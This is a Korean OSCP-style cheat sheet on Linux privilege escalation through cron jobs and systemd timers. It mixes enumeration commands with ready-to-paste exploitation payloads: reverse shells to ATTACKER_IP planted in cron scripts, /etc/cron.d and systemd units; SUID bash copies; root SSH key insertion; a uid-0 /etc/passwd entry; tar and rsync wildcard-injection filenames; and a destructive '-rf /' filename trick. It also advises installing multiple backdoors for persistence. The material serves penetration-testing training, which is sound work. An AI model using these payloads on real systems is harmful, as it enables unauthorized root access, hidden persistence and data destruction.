# Linux Cron Jobs Privilege Escalation

> **OSCP 핵심**: cron job과 scheduled task를 악용하여 root 권한 획득하는 모든 방법들

## ⚡ 즉시 실행할 명령어들

### 🔍 cron 관련 파일 찾기 (30초 안에)

```bash
# 가장 중요한 cron 설정 파일들
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null
ls -la /etc/cron.hourly/ 2>/dev/null
ls -la /etc/cron.daily/ 2>/dev/null
ls -la /etc/cron.weekly/ 2>/dev/null
ls -la /etc/cron.monthly/ 2>/dev/null

# 사용자별 crontab
crontab -l 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null
ls -la /var/spool/cron/ 2>/dev/null
```

### 🎯 실행 중인 cron 프로세스 (즉시)

```bash
# cron 데몬 확인
ps aux | grep -E "(cron|crond)" | grep -v grep

# systemd 타이머 확인 (최신 시스템)
systemctl list-timers 2>/dev/null
systemctl list-units --type=timer 2>/dev/null

# 실시간 cron 실행 모니터링
tail -f /var/log/cron* 2>/dev/null &
tail -f /var/log/syslog 2>/dev/null | grep CRON &
```

### ⚡ 쓰기 가능한 cron 스크립트 찾기

```bash
# cron에서 실행되는 스크립트들 중 쓰기 가능한 것들
find /etc/cron* -type f -writable 2>/dev/null
find /var/spool/cron -type f -writable 2>/dev/null

# 모든 cron 관련 디렉토리의 권한 확인
ls -la /etc/cron* 2>/dev/null
ls -la /var/spool/cron* 2>/dev/null

# 스크립트 파일들의 상세 권한
find /etc/cron* -type f -exec ls -la {} \; 2>/dev/null
```

## 📋 단계별 체크리스트

### Phase 1: cron 발견 및 분석 (2분)

- [ ] **cron 데몬 실행 확인**: `ps aux | grep cron`
- [ ] **시스템 crontab**: `/etc/crontab` 내용 확인
- [ ] **cron 디렉토리들**: `/etc/cron.*` 모든 디렉토리 확인
- [ ] **사용자 crontab**: `crontab -l` 및 `/var/spool/cron` 확인
- [ ] **systemd 타이머**: `systemctl list-timers` (최신 시스템)

### Phase 2: 실행 스크립트 분석 (3분)

- [ ] **스크립트 파일 권한**: cron에서 실행되는 모든 스크립트 권한 확인
- [ ] **스크립트 내용 분석**: 실행되는 명령어들과 경로 확인
- [ ] **PATH 환경변수**: cron의 PATH 설정 확인
- [ ] **와일드카드 사용**: 스크립트에서 \*, ? 사용하는 부분 찾기
- [ ] **상대 경로**: 절대 경로가 아닌 명령어들 확인

### Phase 3: 악용 가능성 확인 (2분)

- [ ] **쓰기 권한**: 스크립트 파일이나 디렉토리에 쓰기 권한 있는지
- [ ] **PATH 하이재킹**: PATH에 쓰기 가능한 디렉토리 있는지
- [ ] **와일드카드 인젝션**: tar, rsync 등에서 와일드카드 사용하는지
- [ ] **심볼릭 링크**: 스크립트가 심볼릭 링크를 따라가는지
- [ ] **파일 생성**: 새로운 cron job 파일 생성 가능한지

### Phase 4: 실시간 모니터링 (지속적)

- [ ] **프로세스 모니터링**: pspy나 기타 도구로 실시간 확인
- [ ] **로그 모니터링**: cron 로그 실시간 추적
- [ ] **파일시스템 변화**: 새로 생성되는 파일들 모니터링
- [ ] **네트워크 연결**: cron이 만드는 네트워크 연결 확인

## 🎯 발견별 즉시 익스플로잇

### 📝 쓰기 가능한 cron 스크립트

```bash
# 1. 기존 스크립트에 백도어 추가
echo '#!/bin/bash' > /tmp/backup.sh
echo 'chmod +s /bin/bash' >> /tmp/backup.sh
# 쓰기 가능한 cron 스크립트에 추가
echo 'bash /tmp/backup.sh' >> /path/to/writable/cron/script.sh

# 2. 직접 리버스쉘 추가
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/cron/script.sh

# 3. SUID 바이너리 생성
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/cron/script.sh

# 4. SSH 키 추가
echo 'mkdir -p /root/.ssh && echo "ssh-rsa YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys' >> /path/to/cron/script.sh

# 5. /etc/passwd 수정
echo 'echo "hacker:\$6\$salt\$hash:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /path/to/cron/script.sh
```

### 🛣️ PATH 하이재킹

```bash
# 1. cron의 PATH 확인
grep PATH /etc/crontab

# 2. PATH의 첫 번째 디렉토리가 쓰기 가능한 경우
# /etc/crontab에서 PATH=/usr/local/bin:/usr/bin:/bin 인 경우
ls -la /usr/local/bin

# 3. 쓰기 가능하면 악성 바이너리 생성
echo '#!/bin/bash' > /usr/local/bin/backup
echo '/bin/bash -p' >> /usr/local/bin/backup
chmod +x /usr/local/bin/backup

# 4. 상대 경로로 호출되는 명령어 하이재킹
# cron 스크립트에서 "tar" 대신 "/usr/bin/tar" 사용하지 않는 경우
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
```

### 🎯 와일드카드 인젝션

```bash
# 1. tar 와일드카드 인젝션 (가장 흔함)
# cron에서 "tar czf backup.tar.gz *" 같은 명령 실행시
cd /target/directory
echo '#!/bin/bash' > shell.sh
echo '/bin/bash -p' >> shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# 2. rsync 와일드카드 인젝션
# cron에서 "rsync -a * /backup/" 실행시
touch -- '-e sh'
echo '#!/bin/bash' > x.sh
echo '/bin/bash -p' >> x.sh
chmod +x x.sh

# 3. chown 와일드카드 인젝션
# cron에서 "chown user:user *" 실행시
touch -- '--reference=/etc/passwd'

# 4. rm 와일드카드 인젝션
# cron에서 "rm *" 실행시 (조심스럽게)
touch -- '-rf /'
```

### 📁 디렉토리 쓰기 권한 악용

```bash
# 1. /etc/cron.d/ 디렉토리에 쓰기 권한이 있는 경우
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' > /etc/cron.d/pwn
echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /etc/cron.d/suid

# 2. /var/spool/cron/crontabs/ 쓰기 권한
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' > /var/spool/cron/crontabs/root

# 3. 사용자 crontab 수정 가능한 경우
(crontab -l 2>/dev/null; echo '* * * * * /tmp/shell.sh') | crontab -
```

### 🔄 systemd 타이머 악용

```bash
# 1. systemd 타이머 서비스 확인
systemctl list-timers
systemctl cat timer_name.timer
systemctl cat timer_name.service

# 2. 서비스 파일이 쓰기 가능한 경우
echo '[Service]' > /etc/systemd/system/pwn.service
echo 'Type=oneshot' >> /etc/systemd/system/pwn.service
echo 'ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' >> /etc/systemd/system/pwn.service

echo '[Unit]' > /etc/systemd/system/pwn.timer
echo 'Description=Pwn Timer' >> /etc/systemd/system/pwn.timer
echo '[Timer]' >> /etc/systemd/system/pwn.timer
echo 'OnCalendar=*:*:0/30' >> /etc/systemd/system/pwn.timer
echo '[Install]' >> /etc/systemd/system/pwn.timer
echo 'WantedBy=timers.target' >> /etc/systemd/system/pwn.timer

systemctl daemon-reload
systemctl enable pwn.timer
systemctl start pwn.timer
```

## 🤖 자동화 도구 활용

### 🔍 pspy - 실시간 프로세스 모니터링

```bash
# pspy 다운로드 및 실행
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O pspy
chmod +x pspy
./pspy

# 또는 32비트 시스템
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32 -O pspy

# 특정 간격으로 실행
./pspy -pf -i 1000  # 1초마다 확인

# 결과를 파일로 저장
./pspy -pf -i 1000 > pspy_output.txt 2>&1 &
```

### 🔧 cron 분석 자동화 스크립트

```bash
# cron 종합 분석 스크립트 (복붙용)
cron_analysis() {
    echo "=== CRON JOBS ANALYSIS ==="

    echo "[+] Cron daemon status:"
    ps aux | grep -E "(cron|crond)" | grep -v grep

    echo -e "\n[+] System crontab:"
    cat /etc/crontab 2>/dev/null

    echo -e "\n[+] Cron directories:"
    for dir in /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
        if [ -d "$dir" ]; then
            echo "=== $dir ==="
            ls -la "$dir" 2>/dev/null
            for file in "$dir"/*; do
                if [ -f "$file" ]; then
                    echo "--- $file ---"
                    cat "$file" 2>/dev/null
                fi
            done
        fi
    done

    echo -e "\n[+] User crontabs:"
    crontab -l 2>/dev/null
    ls -la /var/spool/cron* 2>/dev/null

    echo -e "\n[+] Writable cron files:"
    find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null

    echo -e "\n[+] Systemd timers:"
    systemctl list-timers 2>/dev/null

    echo -e "\n[+] Recent cron logs:"
    tail -20 /var/log/cron* 2>/dev/null
    tail -20 /var/log/syslog 2>/dev/null | grep CRON
}

# 실행
cron_analysis
```

### 🎯 cron 익스플로잇 자동 테스트

```bash
# cron 익스플로잇 자동 테스트 (복붙용)
auto_cron_exploit() {
    echo "=== AUTOMATED CRON EXPLOIT ATTEMPTS ==="

    # 쓰기 가능한 cron 파일들
    writable_crons=$(find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null)
    if [ ! -z "$writable_crons" ]; then
        echo "[!] Found writable cron files:"
        echo "$writable_crons"
        echo "Manual exploit: echo 'payload' >> /path/to/file"
    fi

    # 쓰기 가능한 cron 디렉토리
    writable_dirs=$(find /etc/cron* /var/spool/cron* -type d -writable 2>/dev/null)
    if [ ! -z "$writable_dirs" ]; then
        echo "[!] Found writable cron directories:"
        echo "$writable_dirs"
        echo "Manual exploit: create new cron job file"
    fi

    # PATH 하이재킹 가능성
    path_dirs=$(grep PATH /etc/crontab 2>/dev/null | cut -d'=' -f2 | tr ':' '\n')
    for dir in $path_dirs; do
        if [ -w "$dir" 2>/dev/null ]; then
            echo "[!] PATH hijacking possible in: $dir"
        fi
    done

    # 와일드카드 사용 확인
    wildcard_files=$(grep -r '\*' /etc/cron* 2>/dev/null | grep -v Binary)
    if [ ! -z "$wildcard_files" ]; then
        echo "[!] Wildcard usage found:"
        echo "$wildcard_files"
    fi
}

# 실행
auto_cron_exploit
```

### 🔧 LinPEAS cron 정보 추출

```bash
# LinPEAS에서 cron 관련 정보만 빠르게 확인
./linpeas.sh | grep -A 10 -B 5 -i cron

# 특정 섹션만 실행
./linpeas.sh -o SysI,ProCronSrvcsTmrsSocks | grep -i cron
```

## 👀 놓치기 쉬운 것들

### 🚨 자주 놓치는 체크포인트

```bash
# 1. 다른 사용자의 crontab들
for user in $(cut -d: -f1 /etc/passwd); do
    echo "=== $user crontab ==="
    sudo -u $user crontab -l 2>/dev/null
done

# 2. at 스케줄러 (cron 대신 사용)
atq 2>/dev/null
at -l 2>/dev/null
ls -la /var/spool/at/ 2>/dev/null

# 3. anacron (주기적 실행)
cat /etc/anacrontab 2>/dev/null
ls -la /var/spool/anacron/ 2>/dev/null

# 4. systemd 사용자 타이머
systemctl --user list-timers 2>/dev/null
ls -la ~/.config/systemd/user/ 2>/dev/null

# 5. 임시 cron 파일들
find /tmp /var/tmp -name "*cron*" -o -name "*crontab*" 2>/dev/null

# 6. 백업된 crontab 파일들
find / -name "*.cron*" -o -name "*crontab*" 2>/dev/null | head -20

# 7. 숨겨진 cron 관련 파일들
find /etc -name ".*cron*" 2>/dev/null
find /var -name ".*cron*" 2>/dev/null

# 8. cron 로그 파일들
find /var/log -name "*cron*" 2>/dev/null
find /var/log -name "*syslog*" 2>/dev/null

# 9. cron lock 파일들
find /var/run -name "*cron*" 2>/dev/null
find /var/lock -name "*cron*" 2>/dev/null

# 10. cron 관련 라이브러리나 스크립트
find /usr/lib -name "*cron*" 2>/dev/null | head -10
find /usr/share -name "*cron*" 2>/dev/null | head -10
```

### 🔍 고급 cron 분석 기법

```bash
# 1. cron 스크립트의 의존성 분석
for script in $(find /etc/cron* -type f -executable 2>/dev/null); do
    echo "=== Dependencies for $script ==="
    strings "$script" | grep -E "^/" | head -5
done

# 2. 실행 권한과 소유자 불일치 찾기
find /etc/cron* -type f -not -user root 2>/dev/null
find /etc/cron* -type f -not -group root 2>/dev/null

# 3. 심볼릭 링크 확인
find /etc/cron* -type l 2>/dev/null -exec ls -la {} \;

# 4. 스크립트에서 호출하는 외부 명령어들
for script in $(find /etc/cron* -type f 2>/dev/null); do
    echo "=== External commands in $script ==="
    grep -o '[^/]*[[:space:]]' "$script" 2>/dev/null | grep -v '^#' | sort -u | head -10
done

# 5. 환경 변수 설정 확인
grep -r "export\|PATH\|LD_" /etc/cron* 2>/dev/null

# 6. 네트워크 관련 cron job들
grep -r -i "wget\|curl\|nc\|netcat\|ssh\|scp\|rsync.*::" /etc/cron* 2>/dev/null

# 7. 데이터베이스 관련 cron job들
grep -r -i "mysql\|psql\|mongo\|redis" /etc/cron* 2>/dev/null

# 8. 로그 로테이션 관련
cat /etc/logrotate.conf 2>/dev/null
ls -la /etc/logrotate.d/ 2>/dev/null

# 9. 시간 동기화 관련 (ntpd, chrony)
grep -r "ntp\|chrony" /etc/cron* 2>/dev/null

# 10. 백업 관련 스크립트들 (높은 권한으로 실행됨)
grep -r -i "backup\|dump\|archive" /etc/cron* 2>/dev/null
```

### ⚡ 실시간 모니터링 기법

```bash
# 1. inotify로 파일 변화 모니터링
while true; do
    inotifywait -e modify,create,delete /etc/cron* /var/spool/cron* 2>/dev/null
done

# 2. 프로세스 생성 모니터링 (pspy 없을 때)
while true; do
    ps -eo pid,ppid,cmd --sort=pid | tail -20
    sleep 1
done > process_monitor.log &

# 3. 파일시스템 스냅샷 비교
ls -laR /etc/cron* > /tmp/cron_before.txt
# 잠시 대기 후
ls -laR /etc/cron* > /tmp/cron_after.txt
diff /tmp/cron_before.txt /tmp/cron_after.txt

# 4. 네트워크 연결 모니터링
while true; do
    netstat -tulnp 2>/dev/null | grep LISTEN
    sleep 10
done > network_monitor.log &

# 5. 시스템 로드 모니터링
while true; do
    uptime
    sleep 60
done > load_monitor.log &
```

### 🔧 cron 우회 및 은닉 기법 탐지

```bash
# 1. 비표준 cron 위치들
find /opt /usr/local -name "*cron*" 2>/dev/null
find /home -name "*cron*" 2>/dev/null

# 2. 컨테이너 내부 cron (Docker, LXC)
docker ps 2>/dev/null | grep -v CONTAINER
lxc list 2>/dev/null

# 3. 다른 사용자로 실행되는 cron
ps aux | grep cron | grep -v root

# 4. cron 대신 사용되는 스케줄러들
which fcron 2>/dev/null
which dcron 2>/dev/null
which bcron 2>/dev/null

# 5. 임시 스케줄 (at, batch)
atq
batch -l 2>/dev/null

# 6. systemd 타이머의 실제 서비스 파일들
for timer in $(systemctl list-timers --no-pager --no-legend | awk '{print $1}'); do
    echo "=== $timer ==="
    systemctl cat "$timer" 2>/dev/null
done

# 7. 사용자별 systemd 타이머
for user_home in /home/*; do
    user=$(basename "$user_home")
    echo "=== $user systemd timers ==="
    sudo -u "$user" systemctl --user list-timers 2>/dev/null
done

# 8. 취약한 cron 패턴 검색
grep -r "temp\|tmp" /etc/cron* 2>/dev/null | grep -v "#"
grep -r "\$(" /etc/cron* 2>/dev/null | grep -v "#"
grep -r "`" /etc/cron* 2>/dev/null | grep -v "#"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 2분**: cron 파일들 찾기 및 권한 확인
- **다음 3분**: 스크립트 내용 분석 및 악용 가능성 확인
- **추가 2분**: 실시간 모니터링 도구 실행 (pspy 등)
- **지속적**: 백그라운드에서 cron 실행 대기 (최대 1시간 간격)

### 🎯 성공률 높은 순서

1. **쓰기 가능한 스크립트**: 기존 cron 스크립트 수정 (거의 확실)
2. **PATH 하이재킹**: 상대 경로 명령어 하이재킹 (높은 성공률)
3. **와일드카드 인젝션**: tar, rsync 등에서 파일명 인젝션
4. **새 cron job 생성**: 디렉토리 쓰기 권한 있을 때
5. **systemd 타이머**: 최신 시스템에서 cron 대신 사용

### 🔥 즉시 시도할 것들

- `/etc/crontab`과 `/etc/cron.d/` 우선 확인
- 쓰기 가능한 파일이나 디렉토리 발견시 즉시 익스플로잇
- pspy 도구로 실시간 프로세스 모니터링 시작
- 와일드카드 사용하는 스크립트가 있으면 인젝션 시도

### 💡 팁

- cron job은 보통 분 단위로 실행되므로 인내심 필요
- 백그라운드에서 모니터링하면서 다른 권한상승 방법도 시도
- pspy는 cron 뿐만 아니라 다른 프로세스도 모니터링 가능
- 성공시 지속성 확보를 위해 여러 백도어 설치
- systemd 타이머는 최신 시스템에서 cron을 대체하므로 함께 확인
